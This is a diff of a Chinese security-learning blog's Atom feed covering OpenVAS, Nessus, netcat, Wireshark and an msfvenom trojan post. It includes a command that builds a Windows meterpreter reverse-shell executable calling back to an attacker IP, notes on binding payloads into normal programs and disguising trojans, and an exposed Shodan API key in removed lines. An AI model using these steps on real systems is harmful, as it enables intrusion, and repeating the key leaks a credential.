+<li>创建证书</li>
+<li>同步弱点数据库</li>
+<li>创建客户端证书</li>
+<li>重建数据库</li>
+<li>备份数据库</li>
+<li>启动服务装入插件</li>
+<li>创建管理员账号</li>
+<li>配置服务监听端口</li>
+<li>安装验证</li>
+</ol>
+</li>
+<li>目前配置(kali)</li>
+</ol>
+<pre><code># 初始化安装
+sudo gvm-setup
+
+# 检查安装结果
+gvm-check-setup
+
+# 查看当前帐号
+openvasmd --list-users
+
+# 修改账号密码
+openvasmd --user=admin --new-password=Password
+
+# 升级
+openvas-feed-update
+</code></pre>
+<p><br><br><br><br>
+3. openvas体系<br>
+1. openvas manager，核心组件，负责把其他不同的组件统一进行一个连接，所发出的每一个指令都是通过manager进行下发并调度执行的。<br>
+2. openvas scanner，扫描器，可以管理多个scanner，扫描目标系统，当扫描的任务巨大时，它可以进行多级部署，形成一个集群式的部署方式，也可以在多台服务器上面安装scanner，通过一个manager进行调用scanner扫描不同的目标系统。<br>
+3. osp scanner，osp scanner里包含了多个扫描器，是一个扫描器组，统一交给manager，进行统一管理，每一次扫描对目标系统的扫描配置都是一致的。<br>
+4. Greenbone Security Assistant，绿骨头安全助理，给用户提供一个能够访问openvas manager的一个外部接口，相当于一个Web的服务器端，通过服务器端可以在客户端上面使用Web浏览器上面去访问Web接口去访问这个网站，可以通过这个网站去page去管理manager里面的内容，由manager去制定策略，去指定扫描目标，由scanner对目标进行扫描。<br>
+5. gmp clients，可以使用命令行，通过api去调用管理manager。<br>
+6. 通过feed更新的NVTs，SCAPCERT信息会同步到scanner，manager。<br>
+7. UserData，用户数据会存在本地的数据库里面，通过manager管理。<br>
+8. <img src="https://kite-007.github.io/post-images/1617285259599.png" alt="" loading="lazy"></p>
+<h2 id="2-nessus">2. NESSUS</h2>
+<p>下载链接：<a href="http://www.tenable.com/products/nessus/select-your-operating-system">http://www.tenable.com/products/nessus/select-your-operating-system</a></p>
+<p>安装后进入下载的目录：</p>
+<pre><code># 安装路径：/opt/nessus
+dpkg -i [安装的压缩文件名]
+
+# 启动服务：
+/etc/init.d/nessusd start
+/opt/nessus/bin ./nessusd
+service nessusd start
+
+# 查看服务信息
+/etc/init.d/nessusd status
+/opt/nessus/bin ./nessus-service
+service nessusd status
+
+# 管理地址
+• https://127.0.0.1:8834
+
+# 注册激活码，这个是一次性码如果你卸载，然后重新安装，你需要再次注册扫描仪，并收到另一个激活码。
+• http://www.tenable.com/products/nessus-home
+</code></pre>
+<p><strong>以扫描主机为主</strong><br>
+    与openvas大体上相同，如果需要去做一个扫描，openvas：（page文件——》目标——》text），nessus：（策略policy——》扫描scan），nessus里面默认集成了许多扫描模板，以下是2015年免费使用的模板，当然现在的模板比当时的要多好多了，这里以Advanced Scan为主。<br>
+<br><br><br><br>
+功能模块：</p>
+<ul>
+<li>
+<ol>
+<li>Advanced Scan(高级扫描)<br>
+最经常使用的扫描。</li>
+</ol>
+</li>
+<li>
 <ol start="2">
-<li>被动信息收集：通过第三方引擎与目标进行交互，或不予目标交互查询具体数据库，获的目标信息。</li>
+<li>Basic Network Scan(基础网络扫描)<br>
+完全的操作系统扫描，对任何主机进行一个全系统扫描。</li>
 </ol>
-<ul>
-<li>Google Hacking，Shodan查询等。</li>
-</ul>
-<h1 id="8-shodan">8. Shodan</h1>
-<h2 id="1-shodan基本使用">1. Shodan基本使用</h2>
-<ol>
-<li>搜索摄像头命令：webcam</li>
-<li>搜索开放指定端口的服务器：port：XXX</li>
-<li>搜索指定的IP地址信息：host：XXX.XXX.XXX.XXX</li>
-<li>搜索具体城市开放的具体端口的一些设备：city：XXXXX port：XXX</li>
-</ol>
-<h2 id="2-shodan命令行">2. Shodan命令行</h2>
-<ol>
-<li>kali安装Shodan命令行：easy_install shodan</li>
-<li>Shodan初始化：shodan init [API Key]</li>
-</ol>
-<ul>
-<li>初始化Shodan就是给Shodan初始化API Key。[API Key：hHg9HmLgZuqBc1VsNqWGd10ilpyveeesb].</li>
-<li>这个API Key在自己登陆Shodan页面之后的右上角。</li>
-</ul>
+</li>
+<li>
 <ol start="3">
-<li>Shodan启动与查询具体服务数量</li>
+<li>Bash Shellshock Detection(检测破壳漏洞扫描)2014</li>
 </ol>
-<ul>
-<li>shodan count Apache(可以查询开放了Apache服务在Shodan中的具体数量)</li>
-<li>shodan count Tomcat</li>
-</ul>
+</li>
+<li>
 <ol start="4">
-<li>Shodan命令行搜索功能</li>
+<li>Credentialed Patch Audit(身份验证信息审计)</li>
 </ol>
-<ul>
-<li>利用 shodan search microsoft iis 6.0</li>
-</ul>
+</li>
+<li>
 <ol start="5">
-<li>Shodan获取指定IP地址信息</li>
+<li>Spectre and Meltdown(幽灵病毒)2015<br>
+有的版本叫做（GHOST(glibc) Detection）基于C语言最底层glibc模块的一个漏洞。</li>
 </ol>
-<ul>
-<li>shodan host [ip地址]</li>
-</ul>
+</li>
+<li>
 <ol start="6">
-<li>Shodan获取自己shodan账号信息（会员）</li>
+<li>Host Discovery(主机发现模板)</li>
 </ol>
-<ul>
-<li>shodan info</li>
-</ul>
+</li>
+<li>
 <ol start="7">
-<li>Shodan获取自身外部可见IP地址</li>
+<li>Web Application Tests(Web应用扫描测试)<br>
+通常不会使用这个模块，最新版有这个功能，但是能扫的漏洞非常少，如果需要扫描Web应用，最好使用专业的Web应用扫描器。<br>
+<br><br><br></li>
+</ol>
+</li>
+</ul>
+<p>一下为Advanced Scan模块操作：</p>
+<ol>
+<li>进入主界面，选择policy制作策略，新增策略：</li>
 </ol>
 <ul>
-<li>shodan myip</li>
+<li><img src="https://kite-007.github.io/post-images/1617523402954.png" alt="" loading="lazy"></li>
 </ul>
-<ol start="8">
-<li>Shodan检测是否有蜜罐保护<br>
-shodan honeyscore [目标IP]</li>
-<li>python-shodan（使用python引入shodan）</li>
+<ol start="2">
+<li>nessus先创建策略，在进行Scan，这里直接选择Scan：</li>
 </ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617524121489.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524166643.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524179982.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524188632.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524196330.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524205328.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524232816.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524240163.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524251147.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524261430.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524275439.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524285292.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524293542.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524318178.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524327177.png" alt="" loading="lazy"></li>
+</ul>
+<ol start="3">
+<li>开启扫描，等待完成：</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617524601436.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617524848493.png" alt="" loading="lazy"></li>
+</ul>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[1. 网络攻击]]></title>
-        <id>https://kite-007.github.io/1-wang-luo-gong-ji/</id>
-        <link href="https://kite-007.github.io/1-wang-luo-gong-ji/">
+        <title type="html"><![CDATA[# KALI 基本工具]]></title>
+        <id>https://kite-007.github.io/kali-ji-ben-gong-ju/</id>
+        <link href="https://kite-007.github.io/kali-ji-ben-gong-ju/">
         </link>
-        <updated>2021-03-13T11:49:29.000Z</updated>
+        <updated>2021-04-01T08:50:01.000Z</updated>
         <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">1. 拒绝服务攻击</a>
+<li><a href="#1-netcat-nc">1. NETCAT-NC</a>
 <ul>
-<li><a href="#dos%E6%94%BB%E5%87%BB">Dos攻击</a></li>
+<li><a href="#1-telnet">1. telnet</a></li>
+<li><a href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF">2. 传输文本信息</a></li>
+<li><a href="#3-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95">3. 传输文件，目录</a></li>
+<li><a href="#4-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">4. 加密传输文件</a></li>
+<li><a href="#5-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%9C%A8%E9%A9%AC">5. 远程控制，木马</a></li>
+<li><a href="#6-%E5%8A%A0%E5%AF%86%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F">6. 加密所有流量</a></li>
+<li><a href="#7-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8">7. 流媒体服务器</a></li>
+<li><a href="#8-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98">8. 远程克隆硬盘</a></li>
+</ul>
+</li>
+<li><a href="#wireshark">WIRESHARK</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E5%90%AF%E5%8A%A8%E8%AF%95%E7%9D%80%E6%8A%93%E5%8F%96">启动试着抓取</a></li>
 </ul>
 </li>
 </ul>
-(网络攻击)</p>
-<h1 id="1-拒绝服务攻击">1. 拒绝服务攻击</h1>
-<p><strong>定义：攻击者会想办法让目标停止服务。通常是对目标网络资源上的消耗，使目标的服务器被暂停或者宕机等一系列能够给目标造成麻烦的后果的攻击方式。拒绝服务攻击一直得不到解决，其根本原因是由于网络协议本身的缺陷造成的。攻击者进行拒绝服务攻击，通常有两种效果：一个是迫使服务器的缓冲区溢满，不再接受新的请求，二是使用IP欺骗，迫使服务器把合法的用户的连接复位，影响正常用户的链接</strong></p>
-<h2 id="dos攻击">Dos攻击</h2>
+(基本工具)</p>
+<h1 id="1-netcat-nc">1. NETCAT-NC</h1>
+<pre><code># 查看帮助信息，可用参数
+nc -h
+
+# 显示详细的连接的相关信息，输出内容
+nc -v
+
+# 如果后面紧跟域名，则不会进行dns解析，因为一般解析dns比较慢，所以需要提前把域名解析，直接将IP交予nc使用
+nc -n
+
+nc -nv 1.1.1.1 44
+
+# 指定端口号
+nc -p 4444
+</code></pre>
+<h2 id="1-telnet">1. telnet</h2>
+<ul>
+<li>NC——TELNET / BANNER
+<ul>
+<li>
+<p>能够连接目标端口，发送指令，连接对方服务</p>
+</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-传输文本信息">2. 传输文本信息</h2>
+<h2 id="3-传输文件目录">3. 传输文件，目录</h2>
+<h2 id="4-加密传输文件">4. 加密传输文件</h2>
+<h2 id="5-远程控制木马">5. 远程控制，木马</h2>
+<ul>
+<li>杀毒软件不会查杀</li>
+</ul>
+<h2 id="6-加密所有流量">6. 加密所有流量</h2>
+<h2 id="7-流媒体服务器">7. 流媒体服务器</h2>
+<h2 id="8-远程克隆硬盘">8. 远程克隆硬盘</h2>
+<h1 id="wireshark">WIRESHARK</h1>
+<h2 id="介绍">介绍</h2>
+<ol>
+<li>主要功能为抓包嗅探和协议分析，必备工具。</li>
+</ol>
+<ul>
+<li>在一台主机传输流量到另一台主机上面，可以用此将传输的数据流量包抓取下来，之后提取所有内容信息，抓取下来的包可以对其里面的内容进行分析，也可以保存下来，用于日后的进一步分析或者用于还原当时的网络情景。<br>
+<br></li>
+</ul>
+<ol start="2">
+<li>wireshark本来的主要功能是用于对数据包做流量分析，其抓包的功能本来不属于其本身，使用的是抓包引擎：(用这个组件进行抓取流量包之后，其会将数据流量包传递给wireshark)</li>
+</ol>
+<ul>
+<li>Libpcap9——Linux</li>
+<li>Winpcap10——Windows<br>
+<br></li>
+</ul>
+<ol start="3">
+<li>wireshark里面存在解码定义，是目前所有抓包软件中最优秀的一个，通过解码定义能够对抓取上来的数据流量包(0101···)进行解码分析。</li>
+</ol>
+<h2 id="启动试着抓取">启动试着抓取</h2>
+<pre><code>#启动
+wireshark
+</code></pre>
+<ol>
+<li>启动之后首先要选择一个抓包的网卡</li>
+</ol>
+<ul>
+<li>笔记本一般会有以太网网卡，有线网卡，无线网卡。服务器一般会有多个网卡。这里要指定抓取哪个网卡上面的数据包，这里选择以太网网卡eth0。</li>
+<li><img src="https://kite-007.github.io/post-images/1617542012985.png" alt="" loading="lazy"><br>
+<br></li>
+<li>其他机器里的广播流量包或者一些其他的单通数据包(混杂模式)经过kali机器，那麽流量包就会被抓取下来。</li>
+<li><img src="https://kite-007.github.io/post-images/1617542610555.png" alt="" loading="lazy"><br>
+<br></li>
+<li>设置过滤器，开启混杂模式时一定得过滤掉不需要的，这里可以进行选择，选择之后在方框中可以进行修改，像抓取单个机器，只抓arp包，只抓ip包，抓取端口等等。</li>
+<li><img src="https://kite-007.github.io/post-images/1617543056124.png" alt="" loading="lazy"><br>
+<br></li>
+<li>抓取我打开的一台机器192.168.200.142的包</li>
+<li><img src="https://kite-007.github.io/post-images/1617543442471.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617545465580.png" alt="" loading="lazy"><br>
+<br></li>
+<li>抓取的包可以进行保存，保存的文件类型也可以另存为可以兼容其他工具的类型，通常pcap兼容性比较好，有gzip选项可以进行压缩。</li>
+<li><img src="https://kite-007.github.io/post-images/1617544118866.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617544432352.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617545053020.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617545113241.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617545301247.png" alt="" loading="lazy"><br>
+<br></li>
+<li>首选项里可以更改界面字体等。</li>
+</ul>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[# Linux（Shell编程）]]></title>
-        <id>https://kite-007.github.io/linuxji-chu-xia-pian/</id>
-        <link href="https://kite-007.github.io/linuxji-chu-xia-pian/">
+        <title type="html"><![CDATA[# MSF木马使用(五)]]></title>
+        <id>https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/</id>
+        <link href="https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/">
         </link>
-        <updated>2021-03-11T11:20:09.000Z</updated>
+        <updated>2021-03-30T23:43:21.000Z</updated>
         <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-shell%E4%BB%8B%E7%BB%8D">1. Shell介绍：</a></li>
-<li><a href="#2-shell%E8%84%9A%E6%9C%AC%E7%9A%84%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F">2. Shell脚本的执行方式：</a></li>
-<li><a href="#3-shell%E5%8F%98%E9%87%8F">3. Shell变量</a></li>
-<li><a href="#4-%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">4. 设置环境变量</a></li>
-<li><a href="#5-%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%8F%98%E9%87%8F">5. 位置参数变量</a></li>
-<li><a href="#6-%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F">6. 预定义变量</a></li>
-<li><a href="#7-%E8%BF%90%E7%AE%97%E7%AC%A6">7. 运算符</a></li>
-<li><a href="#8-%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD">8. 条件判断</a></li>
-<li><a href="#9-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6">9. 流程控制</a></li>
-<li><a href="#10-read%E8%AF%BB%E5%8F%96%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%85%A5">10. read读取控制台输入</a></li>
-<li><a href="#11-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0">11. 自定义函数</a></li>
-<li><a href="#12-%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0">12. 系统函数</a></li>
+<li><a href="#1-%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC">1. 捆绑木马</a>
+<ul>
+<li><a href="#1-%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. 简要流程</a></li>
+<li><a href="#2-%E8%82%89%E9%B8%A1%E6%93%8D%E4%BD%9Cmeterpreter">2. 肉鸡操作(meterpreter)</a>
+<ul>
+<li><a href="#1-%E5%88%A9%E7%94%A8rar%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8E%9F%E7%90%86%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC">1. 利用RAR自解压原理运行木马</a></li>
+<li><a href="#2-%E5%AF%B9rar%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BC%AA%E8%A3%85">2. 对RAR木马文件进行伪装</a></li>
 </ul>
-(Linux)</p>
-<h1 id="1-shell介绍">1. Shell介绍：</h1>
-<p><strong>Shell是一个命令行解释器，提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动，挂起，停止甚至编写一些程序。在进行服务集群管理时，需要编写Shell程序来进行服务器管理。</strong><br>
-<img src="https://kite-007.github.io/post-images/1615466696793.png" alt="" loading="lazy"></p>
-<h1 id="2-shell脚本的执行方式">2. Shell脚本的执行方式：</h1>
+</li>
+</ul>
+</li>
+<li><a href="#2-msf%E6%8F%90%E6%9D%83">2. MSF提权</a></li>
+</ul>
+(MSF木马使用)<br>
+<em>msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,配合meterpreter在本地监听上线。</em></p>
+<p>MSF木马使用指令：msfvenom，可以查看木马使用帮助</p>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617147958615.png" alt="" loading="lazy"></li>
+</ul>
+<p>MSF重要参数：</p>
+<pre><code>-p payload设置
+-e 编码设置
+-a 系统结构，默认x86
+-s payload最大大小
+-i 编码次数
+-f 生成文件格式
+</code></pre>
+<hr>
+<p>木马OPTIONS：</p>
+<table>
+<thead>
+<tr>
+<th>选项卡1</th>
+<th>选    项    卡   2</th>
+<th>备注</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-l</td>
+<td>--list</td>
+<td>type&gt;</td>
+<td>列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>--payload</td>
+<td>payload&gt;</td>
+<td>指定需要使用的payload(有效载荷)(--list payloads得到payload列表，--list-options得到指定payload的参数)，如果需要使用自定义的payload,请使用'-'或者stdin指定</td>
+</tr>
+<tr>
+<td></td>
+<td>--list-options</td>
+<td></td>
+<td>列出指定payload的标准,高级和规避选项  例如:msfvenom -p generic/shell_bind_tcp --list-options ，将列出shell_bind_tcp这个payload的各种选项信息</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>--format</td>
+<td>format&gt;</td>
+<td>指定输出格式(使用 --list formats 列出所有的格式)</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>--encoding</td>
+<td>encoder&gt;</td>
+<td>要使用的编码(使用 --list encoders 列出所有的编码) 用于编码加密</td>
+</tr>
+<tr>
+<td></td>
+<td>--smallest</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>-a</td>
+<td>--arch</td>
+<td>arch&gt;</td>
+<td>指定payload的目标CPU架构(使用 --list archs 列出所有的CPU架构)</td>
+</tr>
+<tr>
+<td></td>
+<td>--platform</td>
+<td>platform&gt;</td>
+<td>指定payload的目标操作系统平台(使用 --list platforms 列出所有的操作系统平台)</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>--out</td>
+<td>path&gt;</td>
+<td>将payload保存到文件中</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>--bad-chars</td>
+<td>list&gt;</td>
+<td>指定不使用的字符集 例如:不使用'\x00\xff'这两个字符</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>--nopsled</td>
+<td>length&gt;</td>
+<td>在payload上添加指定长度的nop指令</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>--space</td>
+<td>length&gt;</td>
+<td>设定payload的最大长度    即生成的文件大小</td>
+</tr>
+<tr>
+<td></td>
+<td>--encoder-space</td>
+<td>length&gt;</td>
+<td>设定编码payload的最大长度(默认为-s的值)</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>--iterations</td>
+<td>count&gt;</td>
+<td>对payload进行编码的次数</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>--add-code</td>
+<td>path&gt;</td>
+<td>指定一个自己的win32 shellcode文件</td>
+</tr>
+<tr>
+<td>-x</td>
+<td>--template</td>
+<td>path&gt;</td>
+<td>指定一个可执行程序 将payload捆绑其中,例如:原先有个正常文件normal.exe 通过此选项把payload捆绑到这个程序上面</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>--keep</td>
+<td></td>
+<td>针对-x中的捆绑程序 将创建新线程执行payload 一般情况-x -k选项一起使用</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>--var-name</td>
+<td>value&gt;</td>
+<td>指定用于某些输出格式的自定义变量名称</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>--timeout</td>
+<td>second&gt;</td>
+<td>从STDIN读取有效负载时等待的秒数(默认为30, 0为禁用)</td>
+</tr>
+<tr>
+<td>-h</td>
+<td>--help</td>
+<td></td>
+<td>查看帮助</td>
+</tr>
+</tbody>
+</table>
+<hr>
 <ol>
-<li>脚本的格式要求：
-<ol>
-<li>脚本以#!/bin/bash开头</li>
-<li>脚本需要有可执行权限</li>
+<li>msfvenmo木马生成：</li>
 </ol>
 <ul>
-<li>编写shell：helloworld
+<li>生成木马是由两个必要的参数-p以及-f</li>
+<li>-p：用来指定所需要设置的payload</li>
+</ul>
+<pre><code class="language-shell">./msfvenom –l payloads      //查看所有msf可用的payload列表
+</code></pre>
 <ul>
-<li><img src="https://kite-007.github.io/post-images/1615467173469.png" alt="" loading="lazy"></li>
-<li>创建一个文件shellcode专门用来存放shell</li>
-<li>注意要赋予.sh文件的执行权限</li>
-<li><img src="https://kite-007.github.io/post-images/1615467574630.png" alt="" loading="lazy"></li>
-<li>hello.sh：</li>
+<li>-f：用来指定payload的输出格式</li>
 </ul>
-</li>
-</ul>
-</li>
-</ol>
-<pre><code>  #!/bin/bash
-  echo &quot;helloworld!&quot;
+<pre><code class="language-shell">./msfvenom -p windows/meterpreter/bind_tcp -f exe
+./msfvenom --help –formats      //查看msf支持的输出格式
 </code></pre>
-<h1 id="3-shell变量">3. Shell变量</h1>
-<ol>
-<li>Shell变量介绍：
-<ol>
-<li>Linux变量分为：系统变量和用户自定义变量。</li>
-<li>系统变量：￥HOME、￥PATH、￥SHELL、￥USER等等（$符号被转义）。</li>
-<li>显示当前shell中的所有变量：set。</li>
-</ol>
-</li>
-<li>shell变量的定义：
-<ol>
-<li>变量可以由数字字母下划线组成，但是不能以数字开头。</li>
-<li>等号两边不能有空格</li>
-<li>变量名称一般习惯大写</li>
-</ol>
 <ul>
-<li>将命令的返回值赋给变量：</li>
-<li>A=<code>date</code> 反引号，运行里面的命令，并把结果返回给A</li>
-<li>A=$(date)等价于反引号</li>
+<li>msfvenom举例：</li>
 </ul>
-</li>
-<li>shell变量的定义：
-<ol>
-<li>定义变量：变量名=值；注意不能有空格。</li>
-<li>撤销变量：unset 变量。</li>
-<li>静态变量：readonly变量；注意，不能unset</li>
-</ol>
-<ul>
-<li>var.sh:</li>
-</ul>
-</li>
-</ol>
-<pre><code>#!/bin/bash
-#!/bin/bash
-#定义变量：
-A=100
-#输出变量需要加$符号
-echo $A
-echo A=$A
-echo &quot;A=$A&quot;
-#撤销变量：unset 变量
-unset A
-echo A=$A
-#静态变量：注意，不能unset
-readonly B=1
-echo B=$B
-#unset B
-echo C=`date`
+<pre><code class="language-shell">$./msfvenom -p windows/meterpreter/reverse_tcplhost=[Attacker IP]lport=4444 -f  exe -o /tmp/my_payload.exe
 </code></pre>
-<h1 id="4-设置环境变量">4. 设置环境变量</h1>
+<hr>
+<p><strong>这里在win 7举例</strong></p>
+<h1 id="1-捆绑木马">1. 捆绑木马</h1>
+<h2 id="1-简要流程">1. 简要流程</h2>
 <ol>
-<li>基本语法：
-<ol>
-<li>export 变量名=变量值（将shell变量输出为环境变量/全局变量）</li>
-<li>source 配置文件（让修改后的配置信息立即生效）</li>
-<li>echo $变量名（查询环境变量的值）</li>
+<li>生成木马</li>
 </ol>
-</li>
-<li>说明：
-<ol>
-<li>环境变量可以和多个文件共享</li>
-<li>每次配置完环境变量需要用source命令进行刷新，否则无效</li>
-<li>shell多行注释：（：&lt;&lt;!Enter内容Enter！）</li>
-</ol>
-</li>
-</ol>
-<h1 id="5-位置参数变量">5. 位置参数变量</h1>
-<ul>
-<li>当执行一个shell脚本时，如果想要得到命令行的参数信息，就可以使用到位置参数变量</li>
-<li>案例：./myshell.sh 100 200，可以在myshell.sh中获取到参数信息</li>
-<li>基本语法：
-<ul>
-<li>$n：（n为数字，0代表命令本身，1-9代表第一到九个参数，从第十个开始，参数需要用到大括号包含，例如：{10}）</li>
-<li>$*：（代表命令行中所有的参数，它把所有的参数看成一个整体）</li>
-<li>$@：（这个也代表所有的参数，不过它把每个参数区分对待）</li>
-<li>$#：（代表命令行中所有参数的个数）</li>
-<li>myshell.sh :命令：./myshell.sh 100 200</li>
-</ul>
-</li>
-</ul>
-<pre><code>#/bin/bash
-echo &quot;$0 $1 $2 $3&quot;
-echo &quot;$*&quot;
-echo &quot;$@&quot;
-echo &quot;$#&quot;
-</code></pre>
-<h1 id="6-预定义变量">6. 预定义变量</h1>
-<ol>
-<li>介绍：
-<ol>
-<li>就是shell设计者事先已经设置好的变量，可以直接再shell脚本中使用</li>
-</ol>
-</li>
-<li>基本语法：
-<ol>
-<li>两个$（当前的进程号(PID)）</li>
-<li>$!（后台运行的最后一个进程的进程号(PID)）在命令后面加&amp;表示后台执行</li>
-<li>$?（最后一次执行的命令的返回状态。如果是0表示上一个命令正确执行，如果是非0(具体是哪个数由命令决定)，则反之）</li>
-</ol>
-</li>
-</ol>
-<h1 id="7-运算符">7. 运算符</h1>
-<ol>
-<li>shell的各种运算操作
-<ol>
-<li>基本语法：
-<ol>
-<li>&quot;$((运算式))&quot;或&quot;$[运算式]&quot;或expr m + n //expression表达式</li>
-<li>特别注意：expr运算符之间要有空格，如果希望将expr的结果赋给某个变量，使用``(反引号括起)</li>
-<li>expr *，/，% 乘，除，取余</li>
-</ol>
-</li>
-<li>案例：operator.sh</li>
-</ol>
-</li>
-</ol>
-<pre><code>#/bin/bash
-#案例1：计算（2+3）X4的值
-#方式一：
-RESULT1=$(((2+3)*4))
-echo &quot;RESULT1=$RESULT1&quot;
-#方式二：推荐使用
-RESULT2=$[(2+3)*4]
-echo &quot;RESULT2=$RESULT2&quot;
-#方式三：
-RESULT3=`expr 2 + 3`
-RESULT4=`expr $RESULT3 \* 4`
-echo &quot;RESULT3=$RESULT3&quot;
-echo &quot;RESULT4=$RESULT4&quot;
-#将命令行的两个参数的和
-echo &quot;RESULT=$[($1+$2)*$3]&quot;
-</code></pre>
-<h1 id="8-条件判断">8. 条件判断</h1>
-<ol>
-<li>条件判断语句：
-<ol>
-<li><a href="%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%EF%BC%9Acondition%E7%9A%84%E5%89%8D%E5%90%8E%E8%A6%81%E6%9C%89%E7%A9%BA%E6%A0%BC"> condition </a></li>
-<li>非空返回true，可以使用$?验证（0为true，&gt;1为false）</li>
-<li>[ condition ] &amp;&amp; echo OK || echo notok，条件满足执行后面的语句</li>
-</ol>
-</li>
-<li>条件判断选项<br>
-1.</li>
-<li>判断语句：</li>
-</ol>
-<pre><code>if [ 判断 ]
-then
-    语句
-fi
-</code></pre>
-<ol start="4">
-<li>案例：ifdemo.sh</li>
-</ol>
-<pre><code>#/bin/bash
-#案例1：&quot;OK&quot;是否等于&quot;OK&quot;
-if [ &quot;OK&quot; = &quot;OK&quot; ]
-then
-        echo &quot;equal&quot;
-fi
-#案例2：23是否大于22
-if [ 23 -ge 22 ]
-then
-        echo &quot;大于&quot;
-fi
-#案例3：/root/shellcode/hello.sh文件是否存在
-if [ -f /root/shellcode/hello.sh ]
-then
-        echo &quot;存在该文件&quot;
-fi
-</code></pre>
-<h1 id="9-流程控制">9. 流程控制</h1>
-<ol>
-<li>单分支if
-<ol>
-<li>if [ 条件判断式 ]</li>
-<li>then</li>
-<li>代码语句</li>
-<li>fi（结束标志）</li>
-</ol>
-</li>
-<li>多分支if
-<ol>
-<li>if [ 条件判断式 ]</li>
-<li>then</li>
-<li>代码语句</li>
-<li>elif</li>
-<li>then</li>
-<li>代码语句</li>
-<li>fi（结束标志）</li>
-</ol>
-</li>
-<li>case语句
-<ol>
-<li>case $变量名 in</li>
-<li>&quot;值1&quot;)</li>
-<li>如果变量的值等于值1，则执行程序1</li>
-<li>;;（表示一个语句分支的结束）</li>
-<li>&quot;值2&quot;)</li>
-<li>如果变量的值等于值2，则执行程序2</li>
-<li>;;（表示一个语句分支的结束）</li>
-<li>省略其他分支</li>
-<li>*)</li>
